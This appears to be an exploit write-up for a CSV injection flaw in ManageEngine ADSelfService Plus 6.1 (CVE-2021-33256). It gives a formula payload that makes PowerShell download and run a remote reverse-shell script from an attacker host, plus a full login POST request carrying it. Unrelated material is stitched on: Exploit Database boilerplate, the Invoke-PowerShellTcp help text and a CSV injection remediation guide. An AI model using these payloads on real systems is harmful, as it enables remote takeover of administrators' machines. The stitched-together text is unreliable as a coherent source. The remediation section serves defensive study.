# ManageEngine ADSelfService Plus 6.1 CSV Injection (CVE-2021-33256)

Obtain reverse shell in the domain environment exploiting CSV injection vulnerability

[PreviousThecus N4800Eco Nas Server Control Panel Comand Injection](/0day/thecus-n4800eco-nas-server-control-panel-comand-injection)[NextOpenlitespeed Web Server 1.7.8 - Privilege Escalation (CVE-2021-26758)](/0day/openlitespeed-web-server-1.7.8-command-injection-to-privilege-escalation-cve-2021-26758)

Last updated 9 months ago

### # Description

There is a CSV injection vulnerability on the login panel of ManageEngine ADSelfService can be exploited by unauthenticated user. `j_username` parameter seems to vulnerable and reverse shell could be obtained if privileged user exports *"User Attempts Audit Report"* as CSV file.

Payload:Copy
```
=cmd|'/C powershell.exe -c iex (New-Object Net.WebClient).DownloadString('http://ATTACKER-IP/Invoke-PowerShellTcp.ps1')'!A0
```
### # Proof Of Concept

**1-** Malicious user sends POST request to login page `https://TARGET-IP/j_security_check` and sets `j_username` parameter as like the above payload.

j\_username parameter:Copy
```
=cmd|'/C powershell.exe -c iex (New-Object Net.WebClient).DownloadString('http://ATTACKER-IP/Invoke-PowerShellTcp.ps1')'
```
POST Request:Copy
```
POST /j_security_check HTTP/1.1
Host: 192.168.1.253:9251
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 192
Origin: https://192.168.1.253:9251
Connection: close
Referer: https://192.168.1.253:9251/j_security_check
Cookie: *
Upgrade-Insecure-Requests: 1
j_username=%3Dcmd%7C%27%2FC+powershell.exe+-c+iex+%28New-Object+Net.WebClient%29.DownloadString%28%27http%3A%2F%2F192.168.1.111%2FInvoke-PowerShellTcp.ps1%27%29%27&j_password=admin&domainName=kandemir.local&AUTHRULE_NAME=ADAuthenticator&adscsrf=741024de-45e4-4193-b0a3-d1fd2d663f28
```

And the request attempt will be saved to*"User Attempts Audit Report"* table that is under the *Reports > Audit Reports* section. `Url: https://TARGET-IP/webclient/index.html#/reports/listReports/12`

`j_username`parameter value is saved to *"User Name"* column which is start of line in the CSV file:

Copy
```
=cmd|'/C powershell.exe -c iex (New-Object Net.WebClient).DownloadString('http://192.168.1.111/Invoke-PowerShellTcp.ps1')'
```

**2-** Powershell command that sends reverse shell to attacker machine is embeded to last line of the`Invoke-PowershellTcp.ps1` file.

**3-** If admin user exports this table as CSV file and confirms the alert popup, reverse shell connection will be obtained by malicious user.

Copy
```

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

.DESCRIPTIONThis script is able to connect to a standard netcat listening on a port when using the -Reverse switch. Also, a standard netcat can connect to this script Bind to a specific port.
The script is derived from Powerfun written by Ben Turner & Dave Hardy
.PARAMETER IPAddressThe IP address to connect to when using the -Reverse switch.
.PARAMETER PortThe port to connect to when using the -Reverse switch. When using -Bind it is the port on which this script listens.
.EXAMPLEPS > Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell. A netcat/powercat listener must be listening on the given IP and port.
.EXAMPLEPS > Invoke-PowerShellTcp -Bind -Port 4444
Above shows an example of an interactive PowerShell bind connect shell. Use a netcat/powercat to connect to this port.
.EXAMPLEPS > Invoke-PowerShellTcp -Reverse -IPAddress fe80::20c:29ff:fe9d:b983 -Port 4444
Above shows an example of an interactive PowerShell reverse connect shell over IPv6. A netcat/powercat listener must belistening on the given IP and port.

# CSV Injection

**Author:** Timo Goosen, Albinowax

**Contributor(s):** kingthorin

CSV Injection, also known as Formula Injection, occurs when websites
embed untrusted input inside CSV files.

When a spreadsheet program such as Microsoft Excel or LibreOffice Calc
is used to open a CSV, any cells starting with `=` will be interpreted
by the software as a formula. Maliciously crafted formulas can be used
for three key attacks:

* Hijacking the user’s computer by exploiting vulnerabilities in the spreadsheet software, such as CVE-2014-3524.
* Hijacking the user’s computer by exploiting the user’s tendency to ignore security warnings in spreadsheets that they downloaded from their own website.
* Exfiltrating contents from the spreadsheet, or other open spreadsheets.

This attack is difficult to mitigate, and explicitly disallowed from
quite a few bug bounty programs. To remediate it, ensure that no cells
begin with any of the following characters:

* Equals to (`=`)
* Plus (`+`)
* Minus (`-`)
* At (`@`)
* Tab (`0x09`)
* Carriage return (`0x0D`)

Keep in mind that it is not sufficient to make sure that the untrusted user input does not start with these characters. You also need to take care of the field separator (e.g., ‘`,`’, or ‘`;`’) and quotes (e.g., `'`, or `"`), as attackers could use this to start a new cell and then have the dangerous character in the middle of the user input, but at the beginning of a cell.

Alternatively, apply the following sanitization to each field of the CSV, so that their content will be read as text by the spreadsheet editor:

* Wrap each cell field in double quotes
* Prepend each cell field with a single quote
* Escape every double quote using an additional double quote

Two examples:

| Input | Escaped Output |
| --- | --- |
| `=1+2";=1+2` | `"'=1+2"";=1+2"` |
| `=1+2'" ;,=1+2` | `"'=1+2'"" ;,=1+2"` |
